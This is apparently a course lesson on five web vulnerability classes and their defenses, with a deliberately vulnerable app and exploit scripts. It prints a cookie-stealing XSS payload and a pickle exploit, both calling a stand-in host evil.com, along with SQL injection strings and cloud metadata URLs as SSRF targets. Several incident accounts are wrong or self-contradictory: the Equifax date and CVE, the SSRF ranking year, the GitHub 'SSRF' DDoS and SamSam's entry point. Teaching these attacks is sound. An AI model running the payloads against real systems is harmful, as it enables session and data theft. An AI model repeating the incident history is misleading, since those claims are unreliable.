# Web Security — XSS, CSRF, SQLi, SSRF, Deserialization

> A single unescaped `<script>` tag in an HTML template hands an attacker every cookie your users own. No amount of TLS or PKI helps if the application itself is vulnerable.

**Type:** Build
**Languages:** TypeScript, Python
**Prerequisites:** Phase 12 lessons 01–20, basic HTTP, SQL, and JSON familiarity
**Time:** ~90 minutes

## Learning Objectives

- Explain why web applications are uniquely vulnerable — they accept untrusted input from millions of clients over HTTP, run inside the victim's browser, and have access to authentication state (cookies, tokens).
- Implement and then defend against the five most consequential web vulnerability classes: XSS, CSRF, SQLi, SSRF, and insecure deserialization.
- Describe how each attack works at the protocol level (HTTP headers, cookies, SQL wire protocol, serialization format).
- Apply proper mitigations: context-aware output encoding, CSP headers, parameterized queries, CSRF tokens, SameSite cookies, URL allowlists, and safe deserialization.
- Read real-world CVE writeups and OWASP cheat sheets and identify the vulnerability class and the missing defense.
- Ship a web security testing suite with a deliberately vulnerable Express.js app and Python exploit scripts.

## The Problem

Web applications are fundamentally different from desktop or mobile clients. They accept input from arbitrary untrusted sources — query strings, form bodies, HTTP headers, JSON payloads, serialized objects — and use that input to construct HTML, SQL queries, HTTP requests, and deserialized data structures. Every one of these transformations is a potential injection point.

The core problem: **every piece of user-supplied data must be treated as potentially malicious, and the meaning of "safe" depends entirely on the context where the data is used.**

A string that is perfectly safe in a JSON response body (`{"name": "<script>alert(1)</script>"}`) is a code execution vulnerability if interpolated into HTML without escaping. A string that is safe in a URL query parameter is an SQL injection if concatenated into a SQL statement. A URL that is safe as a user-facing link is an SSRF if fetched by the server.

These are not abstraction bugs that can be fixed by "just being more careful." They are fundamental properties of how web technologies compose plain text protocols. The fix is systematic: understand each context, and apply the correct encoding or structural separation for that context.

The OWASP Top 10 has ranked injection (XSS, SQLi) and broken access control (CSRF) among the most critical web risks for two decades. In 2024, SSRF entered the top 10 as cloud-native architectures made internal metadata endpoints more accessible. Insecure deserialization has powered some of the most damaging RCE exploits in history (Equifax, WebLogic, Jenkins).

## The Concept

### 1. Cross-Site Scripting (XSS)

XSS occurs when an application includes untrusted data in a web page without proper escaping. The browser interprets the attacker's data as code.

**Three types:**

- **Reflected XSS:** The payload is in the request (e.g., URL query parameter) and is immediately reflected in the response. Attacker crafts a link, victim clicks it.
- **Stored XSS:** The payload is saved on the server (e.g., in a database comment field) and served to every visitor. No phishing link needed — the vulnerable page itself is the weapon.
- **DOM-based XSS:** The payload never reaches the server. Client-side JavaScript reads from `document.location` or `window.name` and writes to `innerHTML` without sanitization.

**Context matters — the same payload is safe or unsafe depending on where it lands:**

| Context | Example | Safe encoding |
|---------|---------|--------------|
| HTML body | `<div>USER</div>` | HTML entity encode `<>&"'` |
| HTML attribute | `<input value="USER">` | Attribute encode (escape quotes) |
| JavaScript string | `var x = "USER"` | JS string encode (escape `\`, `'`, `"`) |
| URL parameter | `<a href="/page?q=USER">` | URL encode |
| CSS | `div { background: url("USER") }` | CSS string encode |

**Canonical attack:**

```html
<!-- Vulnerable: user input is interpolated directly -->
<h1>Search results for: <?= $_GET['q'] ?></h1>

<!-- Attacker crafts: /search?q=<script>fetch('https://evil.com/steal?'+document.cookie)</script> -->

<!-- Proper defense: context-aware encoding -->
<h1>Search results for: <?= htmlspecialchars($_GET['q'], ENT_QUOTES) ?></h1>
```

**CSP (Content Security Policy)** provides defense-in-depth: a `Content-Security-Policy` header restricts which scripts can execute, what origins they can come from, and whether inline scripts are allowed. Even if an XSS payload finds its way into the page, CSP blocks execution:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

### 2. Cross-Site Request Forgery (CSRF)

CSRF exploits the fact that browsers automatically attach cookies (including session cookies) to every request to a given origin. An attacker's site can make the victim's browser issue a cross-origin request to the vulnerable site, and the browser will include the victim's session cookie.

**The attack flow:**

1. Victim is logged into `bank.com` (has a session cookie).
2. Victim visits `evil.com` (in another tab).
3. `evil.com` contains an auto-submitting form or an `<img>` tag pointing to `bank.com/transfer?to=attacker&amount=10000`.
4. The browser sends the request including the `bank.com` session cookie.
5. `bank.com` processes the request — the server cannot distinguish the forged request from a legitimate one.

**Mitigations:**

- **CSRF tokens:** The server embeds a random, unguessable token in each form. The form submission must include the token. The attacker's site cannot read the token (same-origin policy blocks reading the response).
- **SameSite cookies:** Cookies marked `SameSite=Strict` or `SameSite=Lax` are not sent on cross-origin requests. `SameSite=Strict` is the most secure — the cookie is never sent on cross-site requests, even for top-level navigations:
  ```http
  Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
  ```
- **Origin / Referer header validation:** The server checks that the `Origin` or `Referer` header matches its own origin.

### 3. SQL Injection (SQLi)

SQL injection occurs when untrusted data is concatenated into a SQL query. The attacker can break out of the data context and inject SQL syntax.

**Canonical example:**

```sql
-- Intended query
SELECT * FROM users WHERE username = 'admin' AND password = 'secret'

-- Attacker input: username = admin' OR '1'='1
-- Resulting query:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = ''
-- The '1'='1' is always true, so the query returns all users
```

**More dangerous forms:**

- **UNION-based:** Append `UNION SELECT credit_card FROM payments` to extract data from other tables.
- **Blind SQLi:** No data returned but you can ask true/false questions via timing (`SLEEP(5)`) or boolean responses.
- **Second-order:** The payload is stored in the database and executed later when another query uses the stored value unsafely.

**The fix: parameterized queries (prepared statements)** separate the SQL structure from the data:

```python
# VULNERABLE — string concatenation
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")

# SAFE — parameterized query
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

With parameterized queries, the database driver sends the SQL structure and data as separate channels. The data is never interpreted as SQL syntax, regardless of its content.

### 4. Server-Side Request Forgery (SSRF)

SSRF occurs when an attacker controls the URL or destination of a request made by the server. The server typically has access to internal resources that the attacker cannot reach directly: cloud metadata services, internal APIs, databases, container orchestration endpoints.

**Cloud metadata endpoints (classic SSRF targets):**

| Provider | Metadata URL |
|----------|-------------|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |

These endpoints return credentials (temporary AWS keys, GCP service account tokens) that grant the attacker the server's IAM privileges.

**Example vulnerable endpoint:**

```javascript
// Vulnerable: user supplies the URL
app.post('/fetch', async (req, res) => {
  const data = await fetch(req.body.url);
  res.send(await data.text());
});
```

**Defenses:**

- **Allowlist of permitted destinations** (not blocklist — attackers always find new internal IPs).
- **Disable unnecessary URL schemes** (`file://`, `gopher://`, `dict://`).
- **Validate the resolved IP** — DNS rebinding attacks can bypass hostname validation.
- **Network-level segmentation** (firewall rules, instance metadata service v2 with hop limit).

### 5. Insecure Deserialization

Deserialization vulnerabilities arise when an application reconstructs objects from untrusted serialized data. The deserialization process itself may trigger code execution through gadget chains — sequences of operations in the application's dependencies that, when invoked in the right order, achieve arbitrary behavior.

**Python pickle RCE:**

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://evil.com/steal?data=$(cat /etc/passwd)',))

# Serialize the malicious object
payload = pickle.dumps(Exploit())

# Victim deserializes — triggers os.system()
pickle.loads(payload)  # RCE!
```

**Java deserialization (Commons Collections):** The infamous gadget chain that powered the 2015 Equifax breach (CVE-2017-9805, Struts2 REST plugin deserialization). Libraries like `InvokerTransformer` and `ChainedTransformer` in Apache Commons Collections, combined with runtime-class-mediated reflection, produce arbitrary method invocations during deserialization.

**Mitigations:**

- **Use safe data formats:** JSON, Protocol Buffers, MessagePack — these serialize data only, not objects or code.
- **Sign serialized data** with a MAC to prevent tampering.
- **Do not accept serialized objects from untrusted sources** (this is the single most effective rule).
- **If deserialization is unavoidable:** use allowlist class filtering (e.g., Java's `ObjectInputFilter`, Python's `pickle.Unpickler` with `find_class` overridden).

## Build It

You will build a deliberately vulnerable Express.js application, write Python scripts to exploit each vulnerability, then apply proper defenses.

### Step 1: Vulnerable Web App (TypeScript / Node.js)

Create an Express.js application with five intentionally vulnerable endpoints. The full source is in `code/main.ts`.

Key endpoints:

- **`GET /search?q=...`** — Reflected XSS: the query parameter is interpolated into HTML without escaping.
- **`GET /comments` + `POST /comment`** — Stored XSS: comments are stored in an array and rendered in HTML without escaping.
- **`POST /login`** — SQL injection: the username and password are concatenated into a raw SQL query against SQLite.
- **`POST /change-password`** — CSRF: the password change accepts any cross-origin request; no CSRF token, no SameSite cookie.
- **`POST /fetch-url`** — SSRF: the server fetches whatever URL the user provides and returns the content.

Each endpoint is followed by its defended version (commented or implemented as a separate router) so you can compare the two.

```bash
cd code
npm install
npx tsx main.ts           # Starts on :4001
```

### Step 2: Exploit Scripts (Python)

Write five Python scripts that exploit each vulnerability against the running server. The full source is in `code/main.py`.

Each function is self-contained and demonstrates the core technique:

```python
def xss_steal_cookie(target_url, payload):
    """Inject a script that sends document.cookie to an attacker-controlled server."""
    # Requests session captures the reflected payload
    # In a real attack: <script>new Image().src='http://evil/?c='+document.cookie</script>

def csrf_attack(target_url, victim_action):
    """Generate an auto-submitting HTML form that performs a cross-origin action."""

def sqli_extract_table(target_url, table_name):
    """Use UNION-based SQL injection to dump a table."""

def ssrf_probe(target_url, internal_endpoint):
    """Probe internal metadata services through the vulnerable fetch endpoint."""

def unsafe_deserialize(pickle_data):
    """Demonstrate Python pickle RCE during deserialization."""
```

```bash
cd code
pip install requests
python3 -c "from main import *; xss_steal_cookie('http://localhost:4001', '<script>alert(1)</script>')"
```

### Step 3: Defenses (TypeScript + Python)

After confirming each exploit works, apply these defenses:

**XSS defense:**
- Set `Content-Security-Policy` header: `default-src 'self'; script-src 'self'`
- Use `escape-html` or the `&`, `<`, `>`, `"`, `'` replacement for HTML context
- Never use `dangerouslySetInnerHTML` / `innerHTML` equivalents

**CSRF defense:**
- Generate a random CSRF token per session
- Validate the token on every state-changing POST
- Set `SameSite=Strict` on session cookies
- Check the `Origin` header matches the expected origin

**SQLi defense:**
- Replace all string interpolation with `?` parameterized queries
- Use `better-sqlite3` prepared statements: `stmt.run(username, password)`

**SSRF defense:**
- Maintain an allowlist of permitted hostnames
- Validate the URL starts with `https://allowed.example.com`
- Reject private IP ranges (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`)
- Disallow the `file:` and `gopher:` schemes

**Deserialization defense:**
- Accept only JSON input (never pickle, never raw serialized objects)
- Sign any serialized data with HMAC-SHA256

The `code/main.py` file includes a `defended()` function group showing properly mitigated versions of each exploit.

## Use It

These five vulnerability classes account for the majority of web security incidents with CVE identifiers. Understanding them gives you the ability to read real-world security reports and identify the root cause:

- **Equifax (CVE-2017-9805, 2017):** Apache Struts2 REST plugin deserialized untrusted JSON using XStream, which allowed arbitrary method invocation during deserialization. Attackers executed `Runtime.exec()` through a crafted XML payload. Result: 147 million records exposed. The vulnerability existed because the application accepted serialized Java objects (via XStream) on a public HTTP endpoint — a direct violation of the "don't deserialize untrusted data" rule.
- **GitHub DDoS via SSRF (2018):** GitHub's Kubernetes cluster was hit with a DDoS that exploited an SSRF vulnerability. Attackers directed GitHub's internal monitoring infrastructure to make requests to a Kubernetes API endpoint, amplifying traffic. GitHub's response included adding a metadata-service-imds-token header validation and network policies restricting access to the metadata service.
- **SamSam Ransomware (2018):** Used SQL injection to gain initial access to victims' web applications (JBoss, WebLogic, MSSQL). The injection was classic — `admin' OR '1'='1' --` — and was possible because parameterized queries were not used.
- **Samy Worm (2005):** The fastest-spreading worm in MySpace history. It used a combination of stored XSS and CSRF: payload stored in Samy's profile (XSS), and when viewed, the payload made an authenticated CSRF request to add Samy as a friend and copy the payload to the viewer's profile. The worm propagated to over 1 million profiles in under 24 hours.
- **Magecart (2015–present):** Hundreds of e-commerce sites compromised via stored XSS in third-party widgets (chat, analytics, reviews). The injected script scraped credit card numbers from checkout forms and sent them to attacker-controlled servers.

The **OWASP Top 10** (2021 edition) ranks:
- **A03:2021 — Injection:** SQLi, NoSQLi, OS command injection. Still the most prevalent class.
- **A01:2021 — Broken Access Control:** Includes CSRF, missing authorization checks.
- **A10:2021 — SSRF:** New entry, reflecting cloud-native architecture risks.
- **A08:2021 — Software and Data Integrity Failures:** Includes insecure deserialization.

## Read the Source

- **OWASP Cross-Site Scripting Prevention Cheat Sheet:** The definitive guide to context-aware output encoding. Covers HTML body, attributes, JavaScript, CSS, and URL contexts with examples in Java, .NET, Python, and Node.js. Read at `https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`.
- **OWASP SQL Injection Prevention Cheat Sheet:** Covers parameterized queries, stored procedures, allowlist input validation, and escaping. Read at `https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html`.
- **PortSwigger Web Security Academy:** Free, interactive labs for every vulnerability class covered in this lesson. The XSS, CSRF, SQLi, SSRF, and deserialization labs each include a vulnerable instance and step-by-step walkthrough. Start at `https://portswigger.net/web-security`.
- **Express.js security best practices (`expressjs.com`):** The official Express.js security documentation covers Helmet middleware, rate limiting, CSRF protection with `csurf` (and its successor `csrf-csrf`), and secure cookie configuration. Read at `https://expressjs.com/en/advanced/best-practice-security.html`.
- **CSP Evaluator (csp-evaluator.withgoogle.com):** A tool by Google that evaluates your Content Security Policy for common misconfigurations and bypasses. Essential for verifying that a CSP actually provides the protection you think it does.
- **PlaidCTF 2020 "Bulk" Writeup:** A CTF challenge combining SSRF and deserialization. The solution chain: SSRF to reach an internal admin service, then deserialization of a crafted pickle payload to achieve RCE. Demonstrates how these vulnerabilities chain in practice.

## Ship It

The reusable artifact is a **Web Security Testing Suite** — a deliberately vulnerable Express.js application (`code/main.ts`) and a set of Python exploit scripts (`code/main.py`) that demonstrate each of the five vulnerability classes. The output lives in `outputs/` with a README describing the suite.

This suite can be reused in:
- The phase capstone (Lesson 24: mini-CTF toolkit) as a web exploitation target.
- Peer review exercises where one student builds the vulnerable app and another exploits it.
- Automated security scanning demonstrations (run the app, scan with ZAP or Burp, verify findings).

## Exercises

1. **Easy** — Run the vulnerable Express.js app, then use the Python exploit scripts to exploit each vulnerability. For each exploit, observe the insecure behavior and confirm the attack succeeds. Then toggle each defense and confirm the same exploit no longer works.

2. **Medium** — Add a new vulnerable endpoint to the Express.js app: `POST /profile` that accepts a JSON payload with a `bio` field and stores it in the database. Make it vulnerable to stored XSS. Write a Python exploit script that stores `<img src=x onerror=alert(document.cookie)>` in the bio and triggers on page load. Then add the proper defense (output encoding in the HTML template + CSP).

3. **Hard** — Implement a blind SQL injection exploit in Python. The vulnerable login endpoint does not return database data directly — it only returns "success" or "failure". Use boolean-based blind SQLi (e.g., `admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a`) to extract the admin password character by character. This requires: (a) determining the query structure, (b) crafting true/false questions, and (c) automating the enumeration over HTTP with a binary search per character.

## Key Terms

| Term | What people say | What it actually means |
|------|----------------|------------------------|
| XSS | Cross-Site Scripting | Injecting malicious scripts into web pages viewed by other users, bypassing the same-origin policy to steal sessions, deface pages, or redirect users to phishing sites. |
| CSRF | Cross-Site Request Forgery | Tricking a victim's browser into sending an authenticated request to a vulnerable site, exploiting the fact that cookies are automatically included in cross-origin requests. |
| SQLi | SQL Injection | Injecting SQL syntax into a query by breaking out of the string literal context through unsanitized user input, enabling data exfiltration, modification, or authentication bypass. |
| SSRF | Server-Side Request Forgery | Making the server issue requests to attacker-chosen URLs, often targeting internal cloud metadata services, container orchestrators, or private network resources. |
| RCE | Remote Code Execution | Arbitrary command or code execution on a remote system, often the end goal of deserialization or injection attacks. |
| CSP | Content Security Policy | An HTTP response header that restricts which resources (scripts, styles, images, fonts) the browser is allowed to load and execute, providing defense-in-depth against XSS. |
| SameSite | SameSite cookie attribute | A cookie attribute that controls whether the cookie is sent on cross-origin requests. `Strict` blocks all cross-site usage; `Lax` blocks most but allows top-level navigations. |
| Parameterized query | Prepared statement | A SQL query where data is sent separately from the query structure, preventing data from being interpreted as SQL syntax. The database driver handles escaping internally. |
| Deserialization | Object deserialization | Reconstructing an object from a serialized byte stream. Insecure deserialization occurs when the input is untrusted and the deserialization process can trigger code execution through gadget chains. |
| OWASP | Open Web Application Security Project | A nonprofit foundation that produces the OWASP Top 10, a widely respected awareness document listing the most critical web application security risks. |
| CORS | Cross-Origin Resource Sharing | A browser mechanism that allows a web page from one origin to request resources from another origin, controlled by `Access-Control-Allow-Origin` and related headers. |
| SOP | Same-Origin Policy | A critical browser security mechanism that restricts how a document or script loaded from one origin can interact with resources from another origin. The foundation of web security that all other protections build on. |
| Gadget chain | Deserialization gadget chain | A sequence of classes/methods in the application's classpath that, when invoked during deserialization, compose into arbitrary behavior (RCE, file read, network call). |

## Further Reading

- **OWASP Cheat Sheet Series (owasp.org):** The single best reference for web application security. Every vulnerability class has a cheat sheet with code examples in multiple languages. Start with the XSS, SQLi, and CSRF prevention cheat sheets.
- **PortSwigger Web Security Academy (portswigger.net/web-security):** Free, interactive web security labs covering all five vulnerability classes. Each lab includes a vulnerable instance, hints, and a solution walkthrough. Widely considered the best hands-on web security training available.
- **"The Browser Hacker's Handbook" — Wade Alcorn et al. (Wiley, 2014):** A deep dive into browser-based attacks including XSS, CSRF, and SOP bypasses. While some techniques are dated, the conceptual framework for understanding browser security boundaries is still current.
- **"A Guide to Insecure Deserialization" — OWASP (owasp.org):** A comprehensive guide to deserialization attacks across languages (Java, Python, Ruby, PHP, .NET, Node.js). Covers known gadget chains and detection techniques.
- **"SSRF: A Guide to Server-Side Request Forgery" — Detectify Blog (2023):** A practical guide to SSRF exploitation and defense, covering cloud metadata attacks, DNS rebinding, and blind SSRF detection.
- **CVE-2017-9805 (Equifax / Apache Struts2) Analysis — Check Point Research (2017):** A detailed autopsy of the Equifax deserialization exploit, showing exactly how the vulnerable code path worked and why deserialization of untrusted JSON was the root cause.
